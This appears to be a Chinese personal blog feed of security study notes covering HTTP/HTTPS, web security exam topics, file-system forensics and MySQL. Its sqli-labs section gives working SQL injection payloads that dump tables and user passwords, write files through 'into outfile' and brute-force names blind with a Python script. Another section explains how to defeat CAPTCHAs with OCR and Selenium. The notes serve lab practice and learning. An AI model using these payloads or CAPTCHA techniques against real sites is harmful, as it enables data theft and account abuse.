<h4 id="—-常见HTTP首部字段"><a href="#—-常见HTTP首部字段" class="headerlink" title="—-常见HTTP首部字段"></a><strong>—-常见HTTP首部字段</strong></h4><p><strong>a、通用首部字段（请求报文与响应报文都会使用的首部字段）</strong><br>Date：创建报文时间<br>Connection：连接的管理<br>Cache-Control：缓存的控制<br>Transfer-Encoding：报文主体的传输编码方式</p>
<p><strong>b、请求首部字段（请求报文会使用的首部字段）</strong><br>Host：请求资源所在服务器<br>Accept：可处理的媒体类型<br>Accept-Charset：可接收的字符集<br>Accept-Encoding：可接受的内容编码<br>Accept-Language：可接受的自然语言</p>
<p><strong>c、响应首部字段（响应报文会使用的首部字段）</strong><br>Accept-Ranges：可接受的字节范围<br>Location：令客户端重新定向到的URI<br>Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段）<br>Allow：资源可支持的HTTP方法<br>Content-Type：实体主类的类型<br>Content-Encoding：实体主体适用的编码方式<br>Content-Language：实体主体的自然语言<br>Content-Length：实体主体的的字节数<br>Content-Range：实体主体的位置范围，一般用于发出部分请求时使用</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/csl/</span> HTTP/1.1</span><br></pre></td></tr></table></figure>

<p><code>GET</code>表示一个读取请求，将从服务器获得网页数据<code>/cs1/</code>表示URL的路径，URL总是以<code>/</code>开头，<code>/</code>就表示首页，最后的<code>HTTP/1.1</code>指示采用的HTTP协议版本是1.1。目前HTTP协议的版本就是1.1，但是大部分服务器也支持1.0版本，主要区别在于1.1版本允许多个HTTP请求复用一个TCP连接，以加快传输速度。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Host</span>: sports.sina.com.cn</span><br></pre></td></tr></table></figure>

<p>表示请求的域名是<code>sports.sina.com.cn</code>。如果一台服务器有多个网站，服务器就需要通过<code>Host</code>来区分浏览器请求的是哪个网站</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br><span class="line"><span class="attribute">Content-Length</span>: 66125</span><br></pre></td></tr></table></figure>

<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
<p><strong>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</strong></p>
<p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
<h4 id="—-常用的HTTP方法有哪些？"><a href="#—-常用的HTTP方法有哪些？" class="headerlink" title="—-常用的HTTP方法有哪些？"></a>—-常用的HTTP方法有哪些？</h4><p>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器<br>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。<br>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。<br>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。<br>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。<br>OPTIONS：查询相应URI支持的HTTP方法。</p>
<h4 id="—-HTTP请求过程"><a href="#—-HTTP请求过程" class="headerlink" title="—-HTTP请求过程"></a><strong>—-HTTP请求过程</strong></h4><p><strong>步骤1：浏览器首先向服务器发送HTTP请求，请求包括：</strong></p>
<p>方法：<code>GET</code>还是<code>POST</code>，<code>GET</code>仅请求资源，<code>POST</code>会附带用户数据；</p>
<p>路径：<code>/full/url/path</code>；</p>
<p>域名：由Host头指定：<code>Host: www.sina.com.cn</code></p>
<p>以及其他相关的Header；</p>
<p>如果是POST，那么请求还包括一个Body，包含用户数据。</p>
<p><strong>步骤2：服务器向浏览器返回HTTP响应，响应包括：</strong></p>
<p>响应代码：<code>200</code>表示成功，<code>3xx</code>表示重定向( <strong>表示要完成请求，需要进一步操作</strong>)，<code>4xx</code>表示客户端发送的请求有错误，<code>5xx</code>表示服务器端处理时发生了错误；</p>
<p>响应类型：由<code>Content-Type</code>指定，例如：<code>Content-Type: text/html;charset=utf-8</code>表示响应类型是HTML文本，并且编码是<code>UTF-8</code>，<code>Content-Type: image/jpeg</code>表示响应类型是JPEG格式的图片；</p>
<p>以及其他相关的Header；</p>
<p>通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。</p>
<p><strong>步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2</strong></p>
<p>Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP响应中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。</p>
<p>HTTP协议同时具备极强的扩展性，虽然浏览器请求的是<code>http://www.sina.com.cn/</code>的首页，但是新浪在HTML中可以链入其他服务器的资源，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称“三达不溜”（WWW）。</p>
<h4 id="—-HTTP格式"><a href="#—-HTTP格式" class="headerlink" title="—-HTTP格式"></a>—-HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，一个HTTP包含Header和Body两部分，其中Body是可选的。</p>
<p>HTTP协议是一种文本协议，所以，它的格式也非常简单。HTTP GET请求的格式：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br></pre></td></tr></table></figure>

<p>每个Header一行一个，换行符是<code>\r\n</code>。</p>
<p>HTTP POST请求的格式：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>当遇到连续两个<code>\r\n</code>时，Header部分结束，后面的数据全部是Body。</p>
<p>HTTP响应的格式：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">200 OK</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>HTTP响应如果包含body，也是通过<code>\r\n\r\n</code>来分隔的。请再次注意，Body的数据类型由<code>Content-Type</code>头来确定，如果是网页，Body就是文本，如果是图片，Body就是图片的二进制数据。</p>
<p>当存在<code>Content-Encoding</code>时，Body数据是被压缩的，最常见的压缩方式是gzip，所以，看到<code>Content-Encoding: gzip</code>时，需要将Body数据先解压缩，才能得到真正的数据。压缩的目的在于减少Body的大小，加快网络传输。</p>
<h4 id="2-HTTPS的基本概念"><a href="#2-HTTPS的基本概念" class="headerlink" title="2.HTTPS的基本概念"></a>2.HTTPS的基本概念</h4><h4 id="—-原理"><a href="#—-原理" class="headerlink" title="—-原理"></a><strong>—-原理</strong></h4><p> Https：是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于<a href="https://baike.baidu.com/item/TCP/IP协议" target="_blank" rel="noopener">TCP/IP协议</a>与各种应用层协议之间，为<a href="https://baike.baidu.com/item/数据通讯" target="_blank" rel="noopener">数据通讯</a>提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol），它建立在可靠的传输协议（如TCP）之上，为高层协议提供<a href="https://baike.baidu.com/item/数据封装" target="_blank" rel="noopener">数据封装</a>、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol），它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
<p><strong>Https设计目标：</strong></p>
<p>(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么 。</p>
<p>(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。</p>
<p>(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方 。</p>
<p><strong>Https原理：</strong></p>
<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<h4 id="3-HTTP与HTTPS的区别"><a href="#3-HTTP与HTTPS的区别" class="headerlink" title="3.HTTP与HTTPS的区别"></a><strong>3.HTTP与HTTPS的区别</strong></h4><p>1、<strong>https协议需要到CA</strong> （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)</p>
<p>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</p>
<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，<strong>前者是80，后者是443</strong>。</p>
<p>4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行<strong>加密传输、身份认证</strong>的网络协议，比http协议安全。(<strong>无状态的意思是其数据包的发送、传输和接收都是相互独立的</strong>。无连接的意思是指通信双方都不长久的维持对方的任何信息。)</p>
<h4 id="—-HTTPS的缺点（对比优点）"><a href="#—-HTTPS的缺点（对比优点）" class="headerlink" title="—-HTTPS的缺点（对比优点）"></a><strong>—-HTTPS的缺点（对比优点）</strong></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长。</p>
<p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p>
<p>3、<strong>Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持</strong>等方面几乎<strong>起不到什么作用</strong>。</p>
<p>4、<strong>SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名</strong>，IPv4资源不可能支撑这个消耗。</p>
<p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 <strong>SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本</strong>。</p>
<p>6、Https协议的<strong>加密范围也比较有限</strong>。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
<h4 id="—-HTTP1-1版本新特性"><a href="#—-HTTP1-1版本新特性" class="headerlink" title="—-HTTP1.1版本新特性"></a>—-HTTP1.1版本新特性</h4><p>a、默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</p>
<p>b、管线化，客户端<strong>可以同时发出多个HTTP请求</strong>，而不用一个个等待响应</p>
<p>c、<strong>断点续传原理</strong></p>
<h4 id="—-HTTP的缺点与HTTPS"><a href="#—-HTTP的缺点与HTTPS" class="headerlink" title="—-HTTP的缺点与HTTPS"></a>—-HTTP的缺点与HTTPS</h4><p>a、通信使用明文不加密，内容可能被窃听<br>b、不验证通信方身份，可能遭到伪装<br>c、无法验证报文完整性，可能被篡改</p>
]]></content>
  </entry>
  <entry>
    <title>php</title>
    <url>/2020/06/11/php/</url>
    <content><![CDATA[<p>考试内容：</p>
<h3 id="web服务器端安全保护措施："><a href="#web服务器端安全保护措施：" class="headerlink" title="web服务器端安全保护措施："></a><strong>web服务器端安全保护措施：</strong></h3><p>1.更改服务器远程端口，默认端口为80，相对来讲不太安全，建议改为随机的5位数端口。<br>2.设置防火墙并关闭不需要的服务和端口。<br>3.定时为数据进行备份。<br>4.把密码设置的复杂一点（防止黑客暴力破解）<br>5.修补已知的漏洞(即时打补丁)<br>6.可以上传的目录不给执行权限，可以执行的目录不给上传权限(防止入侵者通过上传获得webshell)<br>7.降低数据库连接帐户SA的权限，使用public最安全，这样入侵者只能通过猜解用户名和密码来获得webshell</p>
<p>禁止系统文件被非法修改、禁止非法提权操作、禁止恶意代码执行、</p>
<p>禁止加载没有数字签名的驱动、优化系统配置及服务等</p>
<h3 id="web浏览器端采取安全措施"><a href="#web浏览器端采取安全措施" class="headerlink" title="web浏览器端采取安全措施"></a><strong>web浏览器端采取安全措施</strong></h3><p><strong>浏览器的安全机制包括 网页安全模型 和 沙箱模型</strong></p>
<p><strong>1.开启同源策略</strong></p>
<p><strong>2.开启CSP策略</strong></p>
<p>以白名单的形式配置可信任的内容来源在网页中,能够使白名单中的内容正常执行(包含Js,CSS, Image等等)而非白名单的内容无法正常执行,从而减少跨站脚本攻击(XSS)当然,也能够减少运营商劫持的内容注入攻击</p>
<p><strong>3.创建沙箱模型</strong></p>
<p>而沙箱模型则是利用了 Chromium 实现的，利用 代理进程 来创建独立的环境让 目标进程 在当中安全运行。</p>
<p><strong>4.加强cookie防护</strong></p>
<p>定期清理cookie，不在cookie中存放敏感信息，<strong>使用session和cookie双重验证</strong>，增加登录随机验证码，</p>
<p>设置HttpOnly, 如果设置该属性，客户端javascript无法获取Cookie的值</p>
<p><strong>5.安装补丁及配置安全设置</strong></p>
<p>禁止javascript脚本、ActiveX的运行</p>
<p><strong>6.使用安全通信协议</strong></p>
<p>使用HTTPS协议进行通信，保证数据传输的安全。</p>
<p><strong>常见的web安全威胁（OWASP top 10 2017）：</strong></p>
<p>1.注入攻击（主要分为SQL注入和命令执行）:攻击者在输入数据时向解释器提交一些非法或者未授权的命令来欺骗解释权，使解释器错误的执行了这些代码，向攻击者返回一些本不应该被看见的数据</p>
<p>2.失效的身份认证和会话管理</p>
<p>3.敏感数据泄露</p>
<p>4.XML外部实体（XXE）</p>
<p>5.失效的访问控制</p>
<p>6.安全配置错误</p>
<p>7.跨站脚本（XSS）</p>
<p>8.不安全的反序列化</p>
<p>9.使用含有已知漏洞的组件</p>
<p>10.不足的日志记录和监控</p>
<p><strong>常见的注入、xss、csrf、文件上传原理（类型，步骤，危害，防范）：</strong></p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取 资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h3 id="网页验证码技术有哪几种，特点，怎么攻破？"><a href="#网页验证码技术有哪几种，特点，怎么攻破？" class="headerlink" title="网页验证码技术有哪几种，特点，怎么攻破？"></a><strong>网页验证码技术有哪几种，特点，怎么攻破？</strong></h3><p>总的来讲，可以大致划分为三类：</p>
<p><strong>1.字符型验证码：**</strong>常见的数字字母混合验证**</p>
<p><strong>2.图片型验证码：滑动验证码、识别图片物体型、旋转图片型、点触验证码</strong></p>
<p><strong>3.智能型：计算题验证码、语音验证码、短信验证码</strong></p>
<p>特点：</p>
<p><strong>字符型验证码：由各种复杂的字母数字组合而成，且验证码背景有线条干扰或大量小点分布</strong></p>
<p>对于这类验证码，一般的步骤是，先爬取验证码图片到本地，随后对验证码进行识别，识别验证码一般采用OCR技术，即字符识别技术，为了提高识别的准确度，我们会先对图片进行灰度化，再进行二值化，这样识别的准确度会大大提高。也可利用第三方平台的接口，进行破解。</p>
<p><strong>图片型验证码：像图片识别类的验证码的特点主要是复杂，机器辨识度低，机器可替代性弱。</strong></p>
<p>但是现在一样可以做到攻破这类验证码，比如滑动验证码，将背景图、滑块图保存到本地，对比两张图片的位置信息，然后确度滑块位置，利用selenium模块下的函数，模拟点击滑块进行滑动，即可绕过。</p>
<p><strong>智能型验证码：特点主要在于难度高，机器识别困难。</strong></p>
<p>对于这一类可以利用cookie登录，利用cookie的特性：cookie会保持较长的时间，来避免用户频繁登录。</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2020/05/19/sqli-labs/</url>
    <content><![CDATA[<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>知识点：</p>
<p>这题可采用报错注入，updatexml（1，xxx，1） 或者 extractvalue（1，x）</p>
<p>extractvalue(目标xml文档，xml路径)</p>
<p>updatexml(目标xml文档，xml路径，更新的内容)</p>
<p>group_concat():可将相同行的字段整合在一起</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆库</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1                                      </span><br><span class="line"></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆列</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(0x7e,column_name,0x7e) from information_schema.columns where table_name='users') ,0x7e)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(id,0x7e,username,0x7e,password)from users),1) and '1</span><br><span class="line"><span class="comment">#回显不全，可改为concat---limit 0,1 进行逐个查询</span></span><br><span class="line">?id=1' and updatexml(1,(select concat(id,0x7e,username,0x7e,password) from users limit 4,1),1) and '1</span><br></pre></td></tr></table></figure>



<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>和上一关一样，只不过把单引号变成双引号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)  and &quot;1</span><br></pre></td></tr></table></figure>



<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>这里用了双括号括起来，如 $sql=”SELECT * FROM users WHERE id=((‘$id’))”  LIMIT 0,1”;</p>
<p>所以构造语句 ? id =1 ‘ ))  –+  顺利通过验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;var&#x2F;www&#x2F;sqli-labs&#x2F;Less-7&#x2F;uuu.txt&quot; --+</span><br></pre></td></tr></table></figure>



<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>Computer Forensics</title>
    <url>/2020/04/26/Forensics/</url>
    <content><![CDATA[<h2 id="文件系统取证"><a href="#文件系统取证" class="headerlink" title="文件系统取证"></a><strong>文件系统取证</strong></h2><p>课程要求：</p>
<p>了解：计算机启动过程、硬盘结构。</p>
<p>掌握：<strong>FAT文件系统</strong>取证、FAT取证实例、<strong>NTFS文件系统</strong>取证、NTFS取证实例。</p>
<p>英文单词：</p>
<p>clusters: 簇，最小单位</p>
<p>操作系统规定<strong>一个簇中只能放置一个文件的内容</strong>，因此文件所占用的空间，只能是簇的整数倍；如果文件实际大小小于一簇，它也要占一簇的空间。如果文件实际大小大于一簇，根据逻辑推算，那么该文件就要占两个簇的空间。所以，一般情况下文件所占空间要略大于文件的实际大小，只有在少数情况下，即文件的实际大小恰好是簇的整数倍时，文件的实际大小才会与所占空间完全一致。</p>
<p>1.分区表MBR</p>
<p>4个分区表中包含哪些信息</p>
<p>—分区的类型、状态、大小、起始地址、结束地址等等</p>
<p>，内容</p>
<p>2.创建、删除、恢复（在FAT\NTFS)</p>
<p><strong>2.FAT</strong></p>
<p><strong>3.NTFS</strong></p>
<p>每一个文件的头部、38表示</p>
<p>10表示-基本信息属性、30-名字属性、对应位置</p>
<p>常驻属性和非常驻属性</p>
<p>FAT – File Allocation Table （文件分配表）</p>
<p>NTFS – New Technology File System （新技术文件系统）</p>
<p>FAT删除</p>
<p>1.文件名开头以  HEX E5 </p>
<p>2.删除相应的簇链，簇链设置为0</p>
<p>3.最后4个字节是 0A 00  代表文件大小</p>
<p>再往前的 51 00  代表簇号</p>
]]></content>
  </entry>
  <entry>
    <title>MYSQL_SQL_BYPASS</title>
    <url>/2020/04/22/MYSQL-SQL-BYPASS/</url>
    <content><![CDATA[<p>知其然，更要知其所以然！ </p>
<h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><strong>information_schema</strong></h2><p>是用于存储数据库元数据的表，它保存了数据库名，表名，列名等信息，让我们从爆破表名到了可以直接查询</p>
<p>我们经常用到的几个表</p>
<ol>
<li><strong>SCHEMATA表</strong> ： 提供了当前mysql实例中所有数据库的信息。</li>
<li><strong>TABLES 表 ：</strong> 提供了关于数据库中的表的信息。</li>
<li><strong>COLUMNS 表 ：</strong>提供了表中的列信息</li>
</ol>
<p>SCHEMATA: </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | test               | utf8mb4                    | utf8mb4_general_ci     | NULL     |</span><br><span class="line">+<span class="comment">--------------+--------------------+----------------------------+------------------------+----------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure>

<p>TABLES:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [test]&gt; select table_name from information_schema.tables where table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">&#x2F;&#x2F;注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>COLUMNS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select column_name from information_schema.columns where table_name&#x3D;&#39;admin&#39; and table_schema&#x3D;&#39;test&#39;;</span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.001 sec)</span><br></pre></td></tr></table></figure>

<p>user 表保存的用户密码 和host等等信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MariaDB [mysql]&gt; select user,password from user;</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| user | password                                  |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">| root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+------+-------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="符号"><a href="#符号" class="headerlink" title="符号"></a><strong>符号</strong></h2><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a><strong>注释符号</strong></h3><p>MySQL中拥有多种注释符号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># </span><br><span class="line">&#x2F;**&#x2F;  &#x2F;*&#x2F;**&#x2F;这样是等效于&#x2F;**&#x2F;</span><br><span class="line">-- + 用这个符号注意是--空格任意字符很多人搞混了</span><br><span class="line">;%00</span><br><span class="line">&#96;</span><br><span class="line">&#x2F;*!*&#x2F; 内列注释为什么放在这里呢，因为它也可以当作一个空格 &#x2F;*!&#x2F;*!*&#x2F;是等效于&#x2F;*!*&#x2F;的</span><br></pre></td></tr></table></figure>

<h3 id="操作符与逻辑操作符"><a href="#操作符与逻辑操作符" class="headerlink" title="操作符与逻辑操作符"></a><strong>操作符与逻辑操作符</strong></h3><p>排列在同一行的操作符具有相同的优先级</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:&#x3D;</span><br><span class="line"></span><br><span class="line">||, OR, XOR</span><br><span class="line"></span><br><span class="line">&amp;&amp;, AND</span><br><span class="line"></span><br><span class="line">NOT</span><br><span class="line"></span><br><span class="line">BETWEEN, CASE, WHEN, THEN, ELSE</span><br><span class="line"></span><br><span class="line">&#x3D;, &lt;&#x3D;&gt;, &gt;&#x3D;, &gt;, &lt;&#x3D;, &lt;, &lt;&gt;, !&#x3D;, IS, LIKE, REGEXP, IN</span><br><span class="line"></span><br><span class="line">|</span><br><span class="line"></span><br><span class="line">&amp;</span><br><span class="line"></span><br><span class="line">&lt;&lt;, &gt;&gt;</span><br><span class="line"></span><br><span class="line">-, +</span><br><span class="line"></span><br><span class="line">*, &#x2F;, DIV, %, MOD</span><br><span class="line"></span><br><span class="line">^</span><br><span class="line"></span><br><span class="line">- (一元减号), ~ (一元比特反转)</span><br><span class="line"></span><br><span class="line">!</span><br><span class="line"></span><br><span class="line">BINARY, COLLATE</span><br></pre></td></tr></table></figure>

